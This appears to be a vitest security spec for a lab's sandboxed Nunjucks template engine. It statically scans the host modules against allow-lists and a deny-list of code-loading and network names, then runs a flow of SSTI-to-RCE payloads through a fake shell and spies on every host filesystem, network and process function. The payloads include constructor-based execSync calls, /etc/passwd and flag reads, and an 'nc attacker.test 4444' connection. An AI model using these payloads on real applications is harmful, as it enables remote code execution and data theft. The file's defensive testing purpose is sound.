// The SSTI sandbox's HOST side (src/core/ssti/) reaches no filesystem, network, child process or vm, beyond
// worker_threads and what loading the engine strictly needs. Same style as the upload guard (tests/upload-guard.spec.ts)
// and the core/sim/ guard (tests/sim.spec.ts): the modules are parsed with the TypeScript compiler against an
// allow-list, then a whole SSTI -> RCE flow runs with every such function spied (throwing, ES-module bindings too).
//
// THE ONE EXCEPTION, precisely (engine.ts): node:fs's readFileSync is called twice, both in loadAssets(), on two fixed
// files resolved from their packages (never from input): the QuickJS .wasm and the Nunjucks browser bundle (read as
// TEXT, evaluated only inside QuickJS). node:module's createRequire is called twice: in loadAssets() for that
// resolve(), and in sealWorker(), which loads the builtins it seals (and names the host's globalThis, and the strings
// 'fetch', 'WebSocket', 'EventSource', 'Worker') only to replace their functions with ones that throw. Outside our
// code, the QuickJS Emscripten glue (node_modules) requires node:fs, node:path and node:url when it starts, and would read the .wasm itself; engine.ts hands it the compiled module (wasmModule), so
// a render calls no fs function (the runtime spies below prove it, and a sealed worker would fail if it did).
import { execSync } from 'node:child_process';
import { readFileSync, readdirSync } from 'node:fs';
import { createRequire, syncBuiltinESMExports } from 'node:module';
import net from 'node:net';
import { runInNewContext } from 'node:vm';
import ts from 'typescript';
import { afterAll, describe, expect, it, vi } from 'vitest';
import {
  inThreadTransport, renderInSandbox, setSandboxTransport, workerTransport, type SandboxInput,
} from '../src/core/ssti/sandbox.js';

const socketConnect = vi.spyOn(net.Socket.prototype, 'connect');
afterAll(() => {
  const calls = socketConnect.mock.calls.length;
  socketConnect.mockRestore();
  expect(calls, 'a socket was opened while the SSTI guard ran').toBe(0);
});

const SSTI = new URL('../src/core/ssti/', import.meta.url);
const FILES = readdirSync(SSTI).filter((f) => f.endsWith('.ts')).sort();
/** Runtime imports each module may have (type-only imports are erased). node:fs is engine.ts's one exception. */
const ALLOWED: Readonly<Record<string, readonly string[]>> = {
  'engine.ts': ['node:fs', 'node:module', 'node:worker_threads', 'quickjs-emscripten-core', '@jitl/quickjs-wasmfile-release-sync'],
  'transport.ts': ['node:worker_threads', './engine.js'],
  'sandbox.ts': ['./engine.js', './transport.js'],
};
/** The two files loadAssets() may read, by package specifier. */
const ASSETS = ['@jitl/quickjs-wasmfile-release-sync/wasm', 'nunjucks/browser/nunjucks.min.js'];
/*
 * WHAT THE STATIC SCAN IS FOR: it catches ACCIDENTS in the engine's own host code (an fs import, a fetch, an eval).
 * It is not a sandbox against hostile code (a computed name still spells a way to Function): the runtime spies below
 * are the backstop. The template never reaches any of this as code: it runs inside QuickJS-WASM, whose only host
 * binding is the fake shell's bridge. The guest-side JavaScript in engine.ts (RUNNER, FAKE_NODE) is a string the scan
 * does not read as code: it runs inside QuickJS too.
 */

/**
 * Names that reach the network or load or run code, however the call site spells the rest: as an identifier (a
 * variable or a property: `(() => 0).constructor` is the Function constructor without naming Function) and as a
 * string literal. One property is fine: `global`, because QuickJS's `vm.global` is the GUEST's global object.
 * `WebAssembly` is allowed in engine.ts only (it compiles and instantiates the QuickJS module), and so is `globalThis`
 * (sealWorker only, pinned below); `Worker` in transport.ts only. engine.ts may also hold the STRINGS of the network
 * globals and of Worker, which the seal replaces (never as names it could call).
 */
const DENIED: ReadonlySet<string> = new Set([
  'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'globalThis', 'global', 'window', 'self', 'process', 'require',
  'module', 'eval', 'Function', 'constructor', 'Deno', 'Bun', 'WebAssembly', 'Worker',
]);
const ALLOWED_NAMES: Readonly<Record<string, readonly string[]>> = { 'engine.ts': ['WebAssembly', 'globalThis'], 'transport.ts': ['Worker'] };
const ALLOWED_STRINGS: Readonly<Record<string, readonly string[]>> = { 'engine.ts': ['fetch', 'WebSocket', 'EventSource', 'Worker'] };
const ALLOWED_PROPERTIES: ReadonlySet<string> = new Set(['global']);

interface Scan {
  readonly runtime: string[];
  readonly problems: string[];
  /** Named runtime imports per module specifier. */
  readonly named: Map<string, string[]>;
  /** Calls by callee name: the function each call is inside (by name), and the call's first argument as text. */
  readonly calls: { readonly callee: string; readonly inside: string; readonly arg: string }[];
  /** Non-call references to an identifier: the function each is inside. */
  readonly refs: { readonly name: string; readonly inside: string }[];
}

function scan(src: string, allowedNames: readonly string[] = [], allowedStrings: readonly string[] = []): Scan {
  const sf = ts.createSourceFile('m.ts', src, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const out: Scan = { runtime: [], problems: [], named: new Map(), calls: [], refs: [] };
  const fnName = (n: ts.Node): string => {
    for (let p: ts.Node | undefined = n.parent; p !== undefined; p = p.parent) {
      if (ts.isFunctionDeclaration(p) && p.name !== undefined) return p.name.text;
    }
    return '(module)';
  };
  const isPropertyName = (n: ts.Identifier): boolean => {
    const p = n.parent;
    return (ts.isPropertyAccessExpression(p) && p.name === n) || (ts.isPropertyAssignment(p) && p.name === n)
      || (ts.isPropertySignature(p) && p.name === n) || (ts.isPropertyDeclaration(p) && p.name === n)
      || (ts.isMethodDeclaration(p) && p.name === n) || (ts.isMethodSignature(p) && p.name === n);
  };
  const visit = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node) && ts.isStringLiteral(node.moduleSpecifier)) {
      const clause = node.importClause;
      if (!clause?.isTypeOnly) {
        out.runtime.push(node.moduleSpecifier.text);
        const names: string[] = [];
        if (clause?.name !== undefined) names.push(`default as ${clause.name.text}`);
        const b = clause?.namedBindings;
        if (b !== undefined && ts.isNamespaceImport(b)) names.push(`* as ${b.name.text}`);
        if (b !== undefined && ts.isNamedImports(b)) for (const e of b.elements) if (!e.isTypeOnly) names.push(e.name.text);
        out.named.set(node.moduleSpecifier.text, [...(out.named.get(node.moduleSpecifier.text) ?? []), ...names]);
      }
      return; // the import's own identifiers are not references
    } else if (ts.isExportDeclaration(node) && node.moduleSpecifier !== undefined && ts.isStringLiteral(node.moduleSpecifier)) {
      if (!node.isTypeOnly) out.runtime.push(node.moduleSpecifier.text);
      return;
    } else if (ts.isImportEqualsDeclaration(node)) {
      out.problems.push('import = require');
    } else if (ts.isCallExpression(node) && node.expression.kind === ts.SyntaxKind.ImportKeyword) {
      out.problems.push('dynamic import()');
    } else if (ts.isCallExpression(node) && ts.isIdentifier(node.expression)) {
      out.calls.push({ callee: node.expression.text, inside: fnName(node), arg: node.arguments[0]?.getText(sf) ?? '' });
    } else if (ts.isIdentifier(node) && !isPropertyName(node) && !(ts.isCallExpression(node.parent) && node.parent.expression === node)) {
      out.refs.push({ name: node.text, inside: fnName(node) });
    }
    if (ts.isIdentifier(node) || ts.isStringLiteral(node) || ts.isNoSubstitutionTemplateLiteral(node)) {
      const allowedProperty = ts.isIdentifier(node) && isPropertyName(node) && ALLOWED_PROPERTIES.has(node.text);
      const allowedString = !ts.isIdentifier(node) && allowedStrings.includes(node.text);
      if (DENIED.has(node.text) && !allowedNames.includes(node.text) && !allowedProperty && !allowedString) {
        out.problems.push(`${node.text} (line ${sf.getLineAndCharacterOfPosition(node.getStart()).line + 1})`);
      }
    }
    ts.forEachChild(node, visit);
  };
  visit(sf);
  return out;
}

const source = (file: string) => readFileSync(new URL(file, SSTI), 'utf8');

/** Every module the SSTI modules load at runtime, transitively: the files reached and the outside modules. */
function closure(start: readonly string[]): { files: string[]; outside: string[] } {
  const core = new URL('../src/core/', import.meta.url).href;
  const seen = new Set<string>();
  const outside = new Set<string>();
  const walk = (file: URL): void => {
    if (seen.has(file.href)) return;
    seen.add(file.href);
    for (const m of scan(readFileSync(file, 'utf8')).runtime) {
      if (m.startsWith('.')) walk(new URL(m.replace(/\.js$/, '.ts'), file));
      else outside.add(m);
    }
  };
  for (const f of start) walk(new URL(f, SSTI));
  return { files: [...seen].map((h) => h.slice(core.length)).sort(), outside: [...outside].sort() };
}

describe('the SSTI host side imports no filesystem, network or code runner (beyond the one documented exception)', () => {
  it('the guard flags every way to reach a module or a global it does not allow (self-test)', () => {
    const evasions = [
      "import 'node:fs';", "import { readFileSync } from 'fs';", "import * as p from 'node:fs/promises';", "import 'node:http';",
      "export { connect } from 'node:net';", "import d = require('node:dns');", "const r = require('node:child_process');",
      "import { runInNewContext } from 'node:vm';", 'const m = await import(`node:fs`);', "globalThis['fe' + 'tch']('http://x');",
      "fetch('http://x');", 'process.binding("fs");', "(0, eval)('1');", "Function('return 1')();", 'new WebAssembly.Module(b);',
      "new Worker('x.js');", "import x from 'express';", "(() => 0).constructor('return 1')();", "Reflect.get(x, 'fetch');",
      "o['process'];", 'const g = global;',
    ];
    for (const src of evasions) {
      const { runtime, problems } = scan(src);
      expect([...runtime.filter((m) => !ALLOWED['transport.ts'].includes(m)), ...problems], src).not.toEqual([]);
    }
    // QuickJS's `vm.global` is the guest's global, not the host's; a type import is erased. Any other denied name is
    // flagged as a property too.
    expect(scan("import type { Worker } from 'node:worker_threads'; vm.getProp(vm.global, 'nunjucks');"))
      .toMatchObject({ runtime: [], problems: [] });
    expect(scan('const o = { module: 1 }; o.process; x.fetch(1);').problems).toHaveLength(3);
    // An allowed STRING stays a denied NAME.
    expect(scan("const names = ['fetch']; fetch('http://x');", [], ['fetch']).problems).toEqual(['fetch (line 1)']);
  });

  it('src/core/ssti/ is the three modules, each importing only its allow-list, never loading code dynamically', () => {
    expect(FILES).toEqual(['engine.ts', 'sandbox.ts', 'transport.ts']);
    for (const file of FILES) {
      const { runtime, problems } = scan(source(file), ALLOWED_NAMES[file], ALLOWED_STRINGS[file]);
      expect(runtime.filter((m) => !ALLOWED[file].includes(m)), file).toEqual([]);
      expect(problems, file).toEqual([]);
    }
  });

  it('transitively, the sandbox reaches only these three modules and the allow-listed outside modules (no other core file)', () => {
    expect(closure(['sandbox.ts'])).toEqual({
      files: ['ssti/engine.ts', 'ssti/sandbox.ts', 'ssti/transport.ts'],
      outside: ['@jitl/quickjs-wasmfile-release-sync', 'node:fs', 'node:module', 'node:worker_threads', 'quickjs-emscripten-core'],
    });
  });

  it('node:fs is readFileSync only: called twice, in loadAssets, on the two package files; elsewhere only compared (the seal check)', () => {
    const s = scan(source('engine.ts'), ALLOWED_NAMES['engine.ts'], ALLOWED_STRINGS['engine.ts']);
    expect(s.named.get('node:fs')).toEqual(['readFileSync']);
    expect(s.calls.filter((c) => c.callee === 'readFileSync').map((c) => [c.inside, c.arg])).toEqual(
      ASSETS.map((a) => ['loadAssets', `resolve('${a}')`]),
    );
    expect(new Set(s.refs.filter((r) => r.name === 'readFileSync').map((r) => r.inside))).toEqual(new Set(['workerMain']));
    // `resolve` in loadAssets is createRequire's resolver, and nothing else in the file calls one.
    expect(s.calls.filter((c) => c.callee === 'resolve').map((c) => c.inside)).toEqual(['loadAssets', 'loadAssets']);
  });

  it('node:module is createRequire (loadAssets resolves the two files; sealWorker loads only the builtins it seals) and syncBuiltinESMExports', () => {
    const src = source('engine.ts');
    const s = scan(src, ALLOWED_NAMES['engine.ts'], ALLOWED_STRINGS['engine.ts']);
    expect(s.named.get('node:module')).toEqual(['createRequire', 'syncBuiltinESMExports']);
    expect(s.calls.filter((c) => c.callee === 'createRequire').map((c) => [c.inside, c.arg])).toEqual([
      ['loadAssets', 'import.meta.url'], ['sealWorker', 'import.meta.url'],
    ]);
    expect(s.calls.filter((c) => c.callee === 'load').map((c) => [c.inside, c.arg])).toEqual([
      ['sealWorker', "'node:net'"], ['sealWorker', "'node:process'"], ['sealWorker', "'node:worker_threads'"], ['sealWorker', 'id'],
    ]);
    expect(src).toContain('for (const id of SEALED_MODULES) {');
    expect(s.calls.filter((c) => c.callee === 'syncBuiltinESMExports').map((c) => c.inside)).toEqual(['sealWorker']);
    // The host's global object is named in sealWorker only (to seal its network functions).
    expect(new Set(s.refs.filter((r) => r.name === 'globalThis').map((r) => r.inside))).toEqual(new Set(['sealWorker']));
  });

  it('node:worker_threads gives the engine its worker side and the transport its Worker; nothing else', () => {
    expect(scan(source('engine.ts'), ALLOWED_NAMES['engine.ts'], ALLOWED_STRINGS['engine.ts']).named.get('node:worker_threads')).toEqual(['isMainThread', 'parentPort', 'workerData']);
    expect(scan(source('transport.ts'), ALLOWED_NAMES['transport.ts']).named.get('node:worker_threads')).toEqual(['Worker']);
  });
});

/**
 * The guard's OWN list of host functions, written out here and independent of the engine (whose seal ENUMERATES
 * modules): what reaches the disk, the network, a process, the inspector or loads code. The worker must report each
 * one sealed, and this thread spies on each (but NOT_SPIED_HERE) while a whole flow runs.
 */
const HOST_FUNCTIONS: Readonly<Record<string, readonly string[]>> = {
  'node:fs': ['readFile', 'readFileSync', 'writeFile', 'writeFileSync', 'appendFile', 'appendFileSync', 'open', 'openSync',
    'read', 'readSync', 'write', 'writeSync', 'copyFile', 'copyFileSync', 'link', 'linkSync', 'symlink', 'symlinkSync', 'chmod',
    'chmodSync', 'truncate', 'truncateSync', 'opendir', 'opendirSync', 'lstat', 'lstatSync', 'stat', 'statSync', 'realpath',
    'realpathSync', 'openAsBlob', 'mkdir', 'mkdirSync', 'readdir', 'readdirSync', 'unlink', 'unlinkSync', 'rename', 'renameSync',
    'rm', 'rmSync', 'cp', 'cpSync', 'createReadStream', 'createWriteStream', 'watch', 'existsSync', 'access', 'accessSync'],
  'node:fs/promises': ['readFile', 'writeFile', 'appendFile', 'open', 'opendir', 'readdir', 'stat', 'lstat', 'realpath', 'copyFile',
    'link', 'symlink', 'chmod', 'truncate', 'unlink', 'rename', 'rm', 'cp', 'mkdir', 'access', 'watch'],
  'node:http': ['request', 'get', 'createServer'], 'node:https': ['request', 'get', 'createServer'],
  'node:http2': ['connect', 'createServer'], 'node:tls': ['connect', 'createServer'],
  'node:net': ['connect', 'createConnection', 'createServer'], 'node:dgram': ['createSocket'],
  'node:dns': ['lookup', 'resolve', 'resolve4', 'resolve6', 'resolveAny'], 'node:dns/promises': ['lookup', 'resolve'],
  'node:child_process': ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile', 'execFileSync', 'fork', 'ChildProcess'],
  'node:vm': ['runInNewContext', 'runInThisContext', 'runInContext', 'compileFunction', 'createContext', 'Script'],
  'node:inspector': ['open', 'Session'],
  'node:worker_threads': ['Worker'],
};
/** Sealed in the worker by name: a prototype method, the process's native-code doors, and the network globals. */
const HOST_EXTRAS: readonly string[] = [
  'node:net.Socket.prototype.connect', 'node:process.binding', 'node:process.dlopen', 'node:process.kill',
  'globalThis.fetch', 'globalThis.WebSocket',
];
/** What THIS realm legitimately uses while the flow runs: the transport's Worker, vitest's module runner's Script. */
const NOT_SPIED_HERE: ReadonlySet<string> = new Set(['node:worker_threads.Worker', 'node:vm.Script']);

/**
 * Trap every filesystem, network, child-process and vm function in THIS realm: each becomes a spy that THROWS
 * `guard: <name>` and never calls the real one. The spies sit on the CommonJS export objects; syncBuiltinESMExports()
 * points the builtins' ES-module bindings at them too (the self-test checks this spec's own imports before any call).
 */
function installSpies() {
  const load = createRequire(import.meta.url);
  const trap = (mod: object, name: string) =>
    vi.spyOn(mod as Record<string, () => unknown>, name).mockImplementation(() => { throw new Error(`guard: ${name}`); });
  const spies = [trap(globalThis, 'fetch')];
  for (const [id, fns] of Object.entries(HOST_FUNCTIONS)) {
    const mod = load(id) as Record<string, unknown>;
    for (const f of fns) if (typeof mod[f] === 'function' && !NOT_SPIED_HERE.has(`${id}.${f}`)) spies.push(trap(mod, f));
  }
  syncBuiltinESMExports();
  return spies;
}
function releaseSpies(spies: ReturnType<typeof installSpies>): void {
  for (const spy of spies) spy.mockRestore();
  syncBuiltinESMExports();
}

const FLAG = 'HVWA{guard-flag}';
const NODE = { files: { '/srv/forum/flag': `${FLAG}\n` }, env: { FLAG } } as const;
const exec = (cmd: string) => `{{ range.constructor("return process.mainModule.require('child_process').execSync('${cmd}')")() }}`;
/** The whole flow a lab runs: renders, every SSTI -> RCE path through the fake bridge, and every bound. */
const FLOW: readonly (SandboxInput & { readonly expect: Record<string, unknown> })[] = [
  { template: 'Hi {{ name }}', ctx: { name: 'pilgrim' }, expect: { ok: true, output: 'Hi pilgrim' } },
  { template: exec('cat /srv/forum/flag'), node: NODE, expect: { ok: true, output: `${FLAG}\n`, shellCalls: ['cat /srv/forum/flag'] } },
  { template: exec('id; ls /srv/forum; cat /etc/passwd'), node: NODE, expect: { ok: true } },
  { template: exec('nc attacker.test 4444'), node: NODE, expect: { ok: false } },
  { template: '{{ cycler.constructor("return process.env.FLAG")() }}', node: NODE, expect: { ok: true, output: FLAG } },
  { template: "{{ range.constructor(\"return process.mainModule.require('fs')\")() }}", node: NODE, expect: { ok: false } },
  { template: '{% include "/etc/passwd" %}', expect: { ok: false } },
  { template: '{{ range.constructor("while (true) {}")() }}', timeoutMs: 50, expect: { limit: 'timeout' } },
  { template: '{{ range.constructor("var a = []; while (true) a.push(new ArrayBuffer(1 << 20))")() }}', timeoutMs: 1000, expect: { limit: 'memory' } },
  { template: '{{ range.constructor("(function f() { f() })()")() }}', expect: { limit: 'stack' } },
  { template: '{% for i in range(0, 2000) %}0123456789{% endfor %}', expect: { limit: 'output' } },
];
async function wholeFlow(): Promise<void> {
  for (const { expect: want, ...input } of FLOW) expect(await renderInSandbox(input), input.template).toMatchObject(want);
}

describe('a whole SSTI -> RCE flow touches no filesystem, network, child-process or vm function on the host', () => {
  it('the spies throw instead of passing through, and reach ES-module imports (self-test, nothing real is called)', () => {
    const spies = installSpies();
    try {
      for (const spy of spies) expect(spy.getMockImplementation(), spy.getMockName()).toBeDefined();
      // This module's own ESM imports ARE the spies, checked before any call.
      expect([vi.isMockFunction(readFileSync), vi.isMockFunction(runInNewContext), vi.isMockFunction(execSync)]).toEqual([true, true, true]);
      expect(() => readFileSync(new URL(import.meta.url), 'utf8')).toThrow('guard: readFileSync');
      expect(() => runInNewContext('6 * 7')).toThrow('guard: runInNewContext');
      expect(() => execSync('id')).toThrow('guard: execSync');
    } finally {
      releaseSpies(spies);
    }
    expect([vi.isMockFunction(readFileSync), vi.isMockFunction(runInNewContext), vi.isMockFunction(execSync)]).toEqual([false, false, false]);
  });

  it('on the in-thread transport (the engine itself, on this thread): every render and bound, with every such function spied', async () => {
    const t = inThreadTransport();
    const prev = setSandboxTransport(t);
    try {
      await wholeFlow(); // the first use reads the two files and imports what a render loads lazily, before the spies
      const spies = installSpies();
      try {
        await wholeFlow();
        expect(spies.length).toBeGreaterThan(60);
        for (const spy of spies) expect(spy, spy.getMockName()).not.toHaveBeenCalled();
      } finally {
        releaseSpies(spies);
      }
    } finally {
      setSandboxTransport(prev);
      await t.close();
    }
  });

  it('through the real worker, started and used with every such function spied here, and the worker sealed itself', async () => {
    const spies = installSpies();
    const t = workerTransport();
    const prev = setSandboxTransport(t);
    try {
      await wholeFlow();
      for (const spy of spies) expect(spy, spy.getMockName()).not.toHaveBeenCalled();
      // The worker's own realm: its own ES-module binding of readFileSync is the seal (checked right after sealing),
      // and nothing called a sealed function.
      const s = await t.stats();
      expect([s.worker?.renders, s.worker?.sealHits, s.worker?.sealVerified]).toEqual([FLOW.length, 0, true]);
      // Every function of the guard's own list is sealed there,
      const sealed = new Set(s.worker?.sealedNames);
      const listed = [...Object.entries(HOST_FUNCTIONS).flatMap(([id, fns]) => fns.map((f) => `${id}.${f}`)), ...HOST_EXTRAS];
      expect(listed.filter((n) => !sealed.has(n))).toEqual([]);
      // and so is EVERY function of fs and fs/promises, enumerated here, in this realm, on its own.
      const load = createRequire(import.meta.url);
      for (const id of ['node:fs', 'node:fs/promises']) {
        const mod = load(id) as Record<string, unknown>;
        const all = Object.getOwnPropertyNames(mod).filter((k) => typeof mod[k] === 'function').map((k) => `${id}.${k}`);
        expect(all.length, id).toBeGreaterThan(25);
        expect(all.filter((n) => !sealed.has(n)), id).toEqual([]);
      }
    } finally {
      releaseSpies(spies);
      setSandboxTransport(prev);
      await t.close();
    }
  });
});
